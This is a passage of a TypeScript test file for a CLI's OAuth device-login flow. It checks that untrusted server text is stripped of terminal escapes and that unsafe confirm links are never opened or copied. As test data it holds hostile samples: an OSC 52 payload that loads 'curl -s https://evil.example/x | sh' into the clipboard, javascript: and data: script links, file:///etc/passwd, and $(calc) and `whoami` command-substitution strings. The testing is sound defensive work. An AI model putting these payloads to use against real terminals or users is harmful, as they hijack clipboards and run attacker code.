    expect(canOpenBrowser({ WAYLAND_DISPLAY: 'wayland-0' }, 'linux')).toBe(true)
    expect(canOpenBrowser({ WSL_DISTRO_NAME: 'Ubuntu' }, 'linux')).toBe(true)
  })

  it('does not over SSH or on a headless Linux box', () => {
    expect(canOpenBrowser({ SSH_CONNECTION: '1.2.3.4 22 5.6.7.8 22' }, 'darwin')).toBe(false)
    expect(canOpenBrowser({ SSH_TTY: '/dev/pts/0' }, 'linux')).toBe(false)
    expect(canOpenBrowser({}, 'linux')).toBe(false)
  })
})

describe('copyToClipboard', () => {
  it('uses pbcopy on macOS', async () => {
    const run = vi.fn(async (_command: string, _args: string[], _input: string) => true)
    const write = vi.fn()
    await expect(copyToClipboard('https://x', { platform: 'darwin', env: {}, run, write })).resolves.toBe(true)
    expect(run).toHaveBeenCalledWith('pbcopy', [], 'https://x')
    expect(write).not.toHaveBeenCalled()
  })

  it('tries the Linux tools in turn, then the terminal (OSC 52)', async () => {
    const run = vi.fn(async (_command: string, _args: string[], _input: string) => false)
    const write = vi.fn()
    await expect(copyToClipboard('https://x', { platform: 'linux', env: { WAYLAND_DISPLAY: 'w', DISPLAY: ':0' }, run, write })).resolves.toBe(true)
    expect(run.mock.calls.map((c) => c[0])).toEqual(['wl-copy', 'xclip', 'xsel'])
    expect(write).toHaveBeenCalledWith(`\x1b]52;c;${Buffer.from('https://x').toString('base64')}\x07`)
  })

  it('goes straight to the terminal over SSH, where the local clipboard is the far one', async () => {
    const run = vi.fn(async (_command: string, _args: string[], _input: string) => true)
    const write = vi.fn()
    await expect(copyToClipboard('https://x', { platform: 'darwin', env: { SSH_TTY: '/dev/ttys001' }, run, write })).resolves.toBe(true)
    expect(run).not.toHaveBeenCalled()
    expect(write).toHaveBeenCalledOnce()
  })
})

// ── Server text and links are untrusted (Phase 6 review, B2) ────────────────
//
// A workspace name is whatever its owner typed; a hostile server or a man in
// the middle can send anything in any field. Printed raw, an escape sequence
// drives the terminal: OSC 52 writes every member's clipboard, OSC 8 hides a
// link, CSI 2J clears the screen. These tests send such payloads in every field
// login prints and check the bytes written.

/** The renderer's own escapes: bold, dim, normal; cursor hide and show; erase line; up and down 2; CR; LF. */
const OWN_ESCAPES = /\x1b\[(?:1|2|22)m|\x1b\[\?25[hl]|\x1b\[2[KAB]|\r|\n/g
/** What must never reach the terminal from data: C0, DEL, C1, bidi controls, zero-width characters. */
const FORBIDDEN = /[\u0000-\u001f\u007f-\u009f\u200b-\u200f\u202a-\u202e\u2066-\u2069\ufeff]/g

/** Control characters in the bytes written, other than the renderer's own escapes, as U+XXXX. */
function strayControls(raw: string): string[] {
  return Array.from(raw.replace(OWN_ESCAPES, '').matchAll(FORBIDDEN), (m) => `U+${m[0].codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}`)
}

const OSC52_CONTENT = Buffer.from('curl -s https://evil.example/x | sh').toString('base64')
const OSC52_PAYLOAD = `\x1b]52;c;${OSC52_CONTENT}\x07`

const PAYLOADS: Array<[string, string]> = [
  ['a bare ESC', '\x1b'],
  ['OSC 52 (writes the clipboard)', OSC52_PAYLOAD],
  ['OSC 8 (hides a link)', '\x1b]8;;https://evil.example\x1b\\here\x1b]8;;\x1b\\'],
  ['CSI (clears the screen)', '\x1b[2J\x1b[3J\x1b[H'],
  ['C1 controls', '\u009b2J\u009d52;c;ZXZpbA==\u009c\u0085'],
  ['bidi controls', '\u202ereversed\u202c\u2066iso\u2069\u200f\u200e\u202a\u202b\u202d\u2067\u2068'],
  ['zero-width characters', 'z\u200bw\u200cn\u200dj\ufeff'],
  ['other C0 and DEL', '\x00\x07\x08\x0b\x0c\x7f\r\n\t'],
]

const hostile = (payload: string) => `Evil${payload}Corp`

interface FieldCase {
  field: string
  /** The token endpoint's replies, given the hostile text. */
  replies: (text: string) => Array<Reply | 'network'>
  /** fakeServer's options, given the hostile text. */
  server: (text: string) => Parameters<typeof fakeServer>[1]
  exit: number
}

const FIELDS: FieldCase[] = [
  {
    field: 'verification_uri_complete',
    replies: () => [pending(), approved()],
    server: (text) => ({ device: { verification_uri_complete: `https://id.org.ai/device?code=WDJB-MJHT${text}` } }),
    exit: EXIT.ok,
  },
  {
    field: 'verification_uri (with no _complete)',
    replies: () => [pending(), approved()],
    server: (text) => ({ device: { verification_uri_complete: '', verification_uri: `https://id.org.ai/device${text}` } }),
    exit: EXIT.ok,
  },
  {
    field: 'error_description from /oauth/device',
    replies: () => [],
    server: (text) => ({ device: { status: 400, body: { error: 'invalid_client', error_description: text } } }),
    exit: EXIT.failed,
  },
  {
    field: 'error from /oauth/device',
    replies: () => [],
    server: (text) => ({ device: { status: 400, body: { error: text } } }),
    exit: EXIT.failed,
  },
  {
    field: 'error_description from /oauth/token',
    replies: (text) => [{ status: 400, body: { error: 'invalid_grant', error_description: text } }],
    server: () => ({}),
    exit: EXIT.failed,
  },
  {
    field: 'error from /oauth/token',
    replies: (text) => [{ status: 400, body: { error: text } }],
    server: () => ({}),
    exit: EXIT.failed,
  },
  { field: 'userinfo name', replies: () => [pending(), approved()], server: (text) => ({ userinfo: { ...USERINFO, name: text } }), exit: EXIT.ok },
  { field: 'userinfo email', replies: () => [pending(), approved()], server: (text) => ({ userinfo: { ...USERINFO, email: text } }), exit: EXIT.ok },
  { field: 'userinfo org_name', replies: () => [pending(), approved()], server: (text) => ({ userinfo: { ...USERINFO, org_name: text } }), exit: EXIT.ok },
]

describe.each(FIELDS)('$field is printed without control bytes', ({ replies, server, exit }) => {
  it.each(PAYLOADS)('%s', async (_, payload) => {
    const text = hostile(payload)
    fakeServer(replies(text), server(text))
    const { options, term, openUrl, copyText } = loginOptions()
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(8_000)
    await expect(done).resolves.toBe(exit)

    expect(strayControls(term.raw)).toEqual([])
    // The field did reach the screen, cleaned: not a vacuous pass.
    expect(term.raw).toMatch(/Evil[^\n]*Corp/)
    // A link that came with control characters is neither opened nor copied.
    for (const call of [...openUrl.mock.calls, ...copyText.mock.calls]) expect(call[0]).toBe(URL_4A)
  })
})

describe('server text is cleaned on the way in', () => {
  it('cleanText strips C0, DEL, C1, bidi and zero-width characters, and nothing else', () => {
    for (const [, payload] of PAYLOADS) expect(strayControls(cleanText(hostile(payload)))).toEqual([])
    expect(cleanText(`Evil${OSC52_PAYLOAD}Corp`)).toBe(`Evil]52;c;${OSC52_CONTENT}Corp`)
    expect(cleanText('Zoë Ångström · 日本語 · 👩🏽\u200d💻')).toBe('Zoë Ångström · 日本語 · 👩🏽💻')
    expect(cleanText('Bryant Skarda')).toBe('Bryant Skarda')
  })

  it('cleanText caps the length at 200, marking the cut', () => {
    expect(MAX_TEXT_LENGTH).toBe(200)
    expect(cleanText('A'.repeat(200))).toBe('A'.repeat(200))
    expect(cleanText('A'.repeat(5_000))).toBe('A'.repeat(199) + '…')
    expect(Array.from(cleanText('日'.repeat(500))).length).toBe(200)
  })

  it('cleanText makes anything that is not a string empty', () => {
    expect(cleanText(undefined)).toBe('')
    expect(cleanText(null)).toBe('')
    expect(cleanText(42)).toBe('')
    expect(cleanText({ toString: () => '\x1b[2J' })).toBe('')
  })

  it('a long name is cut to 200 characters on the screen', async () => {
    fakeServer([approved()], { userinfo: { ...USERINFO, name: 'A'.repeat(5_000) } })
    const { options, term } = loginOptions()
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(4_000)
    await expect(done).resolves.toBe(EXIT.ok)
    expect(term.line(9)).toBe(`  ✓ Signed in as ${'A'.repeat(199)}… {d}<bryant@driv.ly>{/}`)
  })

  it('getUser hands back cleaned values, and nothing for a field that is not a string', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(async () =>
        json(200, { sub: `user_1${OSC52_PAYLOAD}`, name: { first: 'Bryant' }, email: 'bryant@driv.ly\u202e', org_id: 'org_1\x1b[2J', org_name: `Dri\u200bvly${OSC52_PAYLOAD}` }),
      ),
    )
    const { user } = await getUser('at_test')
    expect(user).toEqual({
      id: `user_1]52;c;${OSC52_CONTENT}`,
      name: undefined,
      email: 'bryant@driv.ly',
      organizationId: 'org_1[2J',
      organizationName: `Drivly]52;c;${OSC52_CONTENT}`,
    })
  })

  it('a token reply that is not JSON fails cleanly, without quoting it', async () => {
    fakeServer([{ status: 200, body: null, raw: `${OSC52_PAYLOAD}not json` }])
    const { options, term, storage } = loginOptions()
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(4_000)
    await expect(done).resolves.toBe(EXIT.failed)
    expect(term.line(9)).toBe("  ✗ Sign-in failed: the server sent a reply the CLI can't read")
    expect(strayControls(term.raw)).toEqual([])
    expect(storage.saved).toBeNull()
  })

  it("authorizeDevice's error carries no control bytes either, for other callers that print it", async () => {
    fakeServer([], { device: { status: 400, body: null, raw: `${OSC52_PAYLOAD}<html>bad gateway</html>` } })
    const error = await authorizeDevice('auto_dev_cli').catch((e: unknown) => e as Error)
    expect(error).toBeInstanceOf(Error)
    expect(error.message).toContain('bad gateway')
    expect(strayControls(error.message)).toEqual([])
  })

  it('a device reply that is not JSON fails cleanly, without quoting it', async () => {
    fakeServer([], { device: { status: 200, body: null, raw: `${OSC52_PAYLOAD}not json` } })
    const { options, term } = loginOptions()
    await expect(runLogin(options)).resolves.toBe(EXIT.failed)
    expect(term.line(3)).toBe("  ✗ Sign-in failed: the server sent a reply the CLI can't read")
    expect(strayControls(term.raw)).toEqual([])
  })
})

// ── The user code is checked strictly ───────────────────────────────────────

describe('the user code', () => {
  it('parseUserCode takes 8 characters of the code alphabet, with or without the hyphen', () => {
    expect(parseUserCode('WDJBMJHT')).toBe('WDJB-MJHT')
    expect(parseUserCode('WDJB-MJHT')).toBe('WDJB-MJHT')
    expect(parseUserCode('ABCDEFGH')).toBe('ABCD-EFGH')
    expect(parseUserCode('JKLMNPQR')).toBe('JKLM-NPQR')
    expect(parseUserCode('STUVWXYZ')).toBe('STUV-WXYZ')
    expect(parseUserCode('2345-6789')).toBe('2345-6789')
  })

  const BAD_CODES: Array<[string, unknown]> = [
    ['an escape sequence', 'WDJB\x1b[2JMJHT'],
    ['OSC 52', OSC52_PAYLOAD],
    ['a bidi control', 'WDJB\u202eMJHT'],
    ['too short', 'WDJBMJH'],
    ['too long', 'WDJBMJHTX'],
    ['lower case', 'wdjb-mjht'],
    ['a 0, outside the alphabet', 'WDJB-MJ0T'],
    ['an I, outside the alphabet', 'WDJB-MJIT'],
    ['a misplaced hyphen', 'WDJ-BMJHT'],
    ['two hyphens', 'WDJB--MJHT'],
    ['a space', 'WDJB MJHT'],
    ['a trailing newline', 'WDJB-MJHT\n'],
    ['a number', 23456789],
    ['nothing', undefined],
  ]

  it.each(BAD_CODES)('parseUserCode refuses %s', (_, code) => {
    expect(parseUserCode(code)).toBeNull()
  })

  it.each(BAD_CODES)('%s: a protocol error, exit 1, the code never echoed', async (_, code) => {
    const server = fakeServer([approved()], { device: { user_code: code as string } })
    const { options, term, openUrl, copyText } = loginOptions()
    await expect(runLogin(options)).resolves.toBe(EXIT.failed)
    expect(term.lines()).toEqual(['', '{b}  auto.dev{/}{d}  ·  sign in with id.org.ai{/}', '', '  ✗ Sign-in failed: the server sent an invalid user code', '', ''])
    expect(strayControls(term.raw)).toEqual([])
    expect(openUrl).not.toHaveBeenCalled()
    expect(copyText).not.toHaveBeenCalled()
    expect(server.tokenCalls()).toBe(0)
  })

  it('a hyphenated code is shown as sent', async () => {
    fakeServer([pending()], { device: { user_code: 'WDJB-MJHT' } })
    const { options, term } = loginOptions()
    void runLogin(options)
    await vi.advanceTimersByTimeAsync(0)
    expect(term.line(3)).toBe('{d}  Code     {/}{b}WDJB-MJHT{/}')
  })

  it('parseDeviceAuthorization refuses a reply with no device code or no link', () => {
    const invalid = { ok: false, error: 'the server sent an invalid reply' }
    expect(parseDeviceAuthorization({ ...DEVICE_REPLY, device_code: undefined })).toEqual(invalid)
    expect(parseDeviceAuthorization({ ...DEVICE_REPLY, device_code: 42 })).toEqual(invalid)
    expect(parseDeviceAuthorization({ ...DEVICE_REPLY, verification_uri: undefined, verification_uri_complete: undefined })).toEqual(invalid)
    expect(parseDeviceAuthorization(null)).toEqual({ ok: false, error: 'the server sent an invalid user code' })
  })

  it('parseDeviceAuthorization hands back clean values', () => {
    expect(parseDeviceAuthorization(DEVICE_REPLY, 'https://id.org.ai')).toEqual({
      ok: true,
      grant: { deviceCode: 'dc_test', userCode: 'WDJB-MJHT', url: URL_4A, link: URL_4A, expiresIn: 1800, interval: 4 },
    })
    expect(parseDeviceAuthorization({ ...DEVICE_REPLY, verification_uri_complete: 'file:///etc/passwd', expires_in: 'soon' }, 'https://id.org.ai')).toEqual({
      ok: true,
      grant: { deviceCode: 'dc_test', userCode: 'WDJB-MJHT', url: 'file:///etc/passwd', link: undefined, expiresIn: 600, interval: 4 },
    })
  })
})

// ── The confirm link is opened and copied only when it is safe ──────────────

describe('the confirm link', () => {
  const UNSAFE_LINKS: Array<[string, string]> = [
    ['file:', 'file:///etc/passwd'],
    ['javascript:', 'javascript:alert(document.cookie)'],
    ['data:', 'data:text/html,<script>alert(1)</script>'],
    ['a foreign host', 'https://evil.example/device?code=WDJB-MJHT'],
    ['a look-alike host', 'https://id.org.ai.evil.example/device?code=WDJB-MJHT'],
    ['credentials in front of a foreign host', 'https://id.org.ai@evil.example/device?code=WDJB-MJHT'],
    ['credentials on the right host', 'https://user:pass@id.org.ai/device?code=WDJB-MJHT'],
    ['http: on a non-loopback host', 'http://id.org.ai/device?code=WDJB-MJHT'],
    ['another port', 'https://id.org.ai:8443/device?code=WDJB-MJHT'],
    ['a protocol-relative link', '//evil.example/device'],
    ['a leading - (an option to the opener)', '-a Calculator'],
    ['a leading -- before a good link', '--new-window=https://id.org.ai/device?code=WDJB-MJHT'],
    ['a control character', 'https://id.org.ai/device?code=WDJB-MJHT\x1b]8;;https://evil.example\x07'],
    ['a space', 'https://id.org.ai/device?code=WDJB-MJHT https://evil.example'],
    ['a character no URL needs', 'https://id.org.ai/device?code=$(calc)`whoami`'],
    ['more than 200 characters', `https://id.org.ai/device?code=WDJB-MJHT&pad=${'a'.repeat(200)}`],
  ]

  it.each(UNSAFE_LINKS)('%s: not opened, not copied, shown with a warning', async (_, link) => {
    fakeServer([pending(), pending(), pending()], { device: { verification_uri_complete: link } })
    const { options, term, keys, openUrl, copyText } = loginOptions()
    void runLogin(options)
    await vi.advanceTimersByTimeAsync(0)
    keys.press('o')
    keys.press('c')
    keys.press('O')
    keys.press('C')
    await vi.advanceTimersByTimeAsync(1)

    expect(openUrl).not.toHaveBeenCalled()
    expect(copyText).not.toHaveBeenCalled()
    expect(term.line(4)).toBe(`{d}  Confirm  {/}${cleanText(link)}`)
    expect(term.line(5)).toBe("           Not opened: this link isn't on https://id.org.ai.")
    expect(strayControls(term.raw)).toEqual([])
  })

  it('the warning is printed when not a terminal too', async () => {
    fakeServer([pending(), approved()], { device: { verification_uri_complete: 'file:///etc/passwd' } })
    const term = new FakeTerminal(false)
    const { options, openUrl } = loginOptions({ term, keys: new FakeKeys(false) })
    const done = runLogin(options)
    await vi.advanceTimersByTimeAsync(8_000)
    await expect(done).resolves.toBe(EXIT.ok)
    expect(term.raw.split('\n').slice(3, 6)).toEqual(['  Code     WDJB-MJHT', '  Confirm  file:///etc/passwd', "           Not opened: this link isn't on https://id.org.ai."])
    expect(openUrl).not.toHaveBeenCalled()
  })

  it('a good https link on the API origin still opens and copies, normalised', async () => {
    fakeServer([pending(), pending()], { device: { verification_uri_complete: 'HTTPS://ID.ORG.AI:443/device?code=WDJB-MJHT' } })
    const { options, term, keys, openUrl, copyText } = loginOptions()
    void runLogin(options)
    await vi.advanceTimersByTimeAsync(0)
    expect(openUrl).toHaveBeenCalledWith(URL_4A)
    expect(term.line(4)).toBe(`{d}  Confirm  {/}${URL_4A}`)
    keys.press('c')
    await vi.advanceTimersByTimeAsync(1)
    expect(copyText).toHaveBeenCalledWith(URL_4A)
  })

  it('openableUrl: https on the API origin, or http on a loopback API', () => {
    expect(openableUrl(URL_4A, 'https://id.org.ai')).toBe(URL_4A)
    expect(openableUrl('https://id.org.ai/device', 'https://id.org.ai/')).toBe('https://id.org.ai/device')
    expect(openableUrl('http://localhost:8787/device?code=WDJB-MJHT', 'http://localhost:8787')).toBe('http://localhost:8787/device?code=WDJB-MJHT')
    expect(openableUrl('http://127.0.0.1:8787/device', 'http://127.0.0.1:8787')).toBe('http://127.0.0.1:8787/device')
    expect(openableUrl('http://[::1]:8787/device', 'http://[::1]:8787')).toBe('http://[::1]:8787/device')
  })

  it('openableUrl: never http on a non-loopback host, another origin, or with a bad API base', () => {
    expect(openableUrl('http://example.test/device', 'http://example.test')).toBeNull()
    expect(openableUrl('http://localhost:9999/device', 'http://localhost:8787')).toBeNull()
    expect(openableUrl('http://localhost:8787/device', 'https://id.org.ai')).toBeNull()
    expect(openableUrl('https://id.org.ai/device', 'not a url')).toBeNull()
    expect(openableUrl(undefined, 'https://id.org.ai')).toBeNull()
    for (const [, link] of UNSAFE_LINKS) expect(openableUrl(link, 'https://id.org.ai')).toBeNull()
  })
})

// ── The browser is opened without a shell ───────────────────────────────────

describe('openInBrowser', () => {
  /** A child_process.spawn stand-in: records each call; the commands in `missing` fail to start (ENOENT). */
  function fakeSpawn(missing: string[] = []) {
    const calls: Array<{ command: string; args: string[]; options: Record<string, unknown> }> = []
    const spawn: SpawnBrowser = (command, args, options) => {
      calls.push({ command, args: [...args], options: { ...options } })
      const child = Object.assign(new EventEmitter(), { unref: vi.fn() })
      // Native promises are never faked, so this runs once the listeners are on.
      void Promise.resolve().then(() => {
        if (missing.includes(command)) child.emit('error', Object.assign(new Error(`spawn ${command} ENOENT`), { code: 'ENOENT' }))
        else child.emit('spawn')
      })
      return child
    }
    return { spawn, calls }
  }

  /** Every launch: no shell, and the link as one whole argument, last. */
  function expectNoShell(calls: ReturnType<typeof fakeSpawn>['calls'], url: string) {
    expect(calls.length).toBeGreaterThan(0)
    for (const { command, args, options } of calls) {
      expect(options.shell).toBeFalsy()
      expect(command).not.toMatch(/powershell|pwsh|^cmd(\.exe)?$|^sh$|bash/i)
      expect(args.at(-1)).toBe(url)
    }
  }

  const LINK = 'https://id.org.ai/device?code=WDJB-MJHT&x=$(calc)'

  it('macOS: open, no shell', async () => {
    const { spawn, calls } = fakeSpawn()
    await expect(openInBrowser(LINK, { platform: 'darwin', env: {}, spawn })).resolves.toBe(true)
    expect(calls.map((c) => [c.command, c.args])).toEqual([['open', [LINK]]])
    expectNoShell(calls, LINK)
  })

  it('Windows: rundll32, not PowerShell or cmd', async () => {
    const { spawn, calls } = fakeSpawn()
    await expect(openInBrowser(LINK, { platform: 'win32', env: {}, spawn })).resolves.toBe(true)
    expect(calls.map((c) => [c.command, c.args])).toEqual([['rundll32', ['url.dll,FileProtocolHandler', LINK]]])
    expectNoShell(calls, LINK)
  })

  it('Linux: xdg-open, no shell', async () => {
    const { spawn, calls } = fakeSpawn()
    await expect(openInBrowser(LINK, { platform: 'linux', env: { DISPLAY: ':0' }, spawn })).resolves.toBe(true)
    expect(calls.map((c) => [c.command, c.args])).toEqual([['xdg-open', [LINK]]])
    expectNoShell(calls, LINK)
  })

  it('WSL: wslview, then the Windows opener, then xdg-open; never PowerShell', async () => {
    const { spawn, calls } = fakeSpawn(['wslview', 'rundll32.exe'])
    await expect(openInBrowser(LINK, { platform: 'linux', env: { WSL_DISTRO_NAME: 'Ubuntu' }, spawn })).resolves.toBe(true)
    expect(calls.map((c) => c.command)).toEqual(['wslview', 'rundll32.exe', 'xdg-open'])
    expectNoShell(calls, LINK)
  })

  it('resolves false when no opener starts', async () => {
    const { spawn } = fakeSpawn(['xdg-open'])
    await expect(openInBrowser(LINK, { platform: 'linux', env: { DISPLAY: ':0' }, spawn })).resolves.toBe(false)
  })

  it.each([
    ['file:', 'file:///etc/passwd'],
    ['javascript:', 'javascript:alert(1)'],
    ['a leading -', '-a Calculator'],
    ['a leading --', '--args https://id.org.ai/device'],
    ['an option after a space', ' -a Calculator'],
    ['a space', 'https://id.org.ai/device https://evil.example'],
    ['a control character', 'https://id.org.ai/device\x1b[2J'],
  ])('never launches %s', async (_, url) => {
    for (const platform of ['darwin', 'win32', 'linux']) {
      const { spawn, calls } = fakeSpawn()
      await expect(openInBrowser(url, { platform, env: { DISPLAY: ':0' }, spawn })).resolves.toBe(false)
      expect(calls).toEqual([])
    }
  })

  it('never launches over SSH', async () => {
    const { spawn, calls } = fakeSpawn()
    await expect(openInBrowser(LINK, { platform: 'darwin', env: { SSH_CONNECTION: '1.2.3.4 22 5.6.7.8 22' }, spawn })).resolves.toBe(false)
    expect(calls).toEqual([])
  })
})
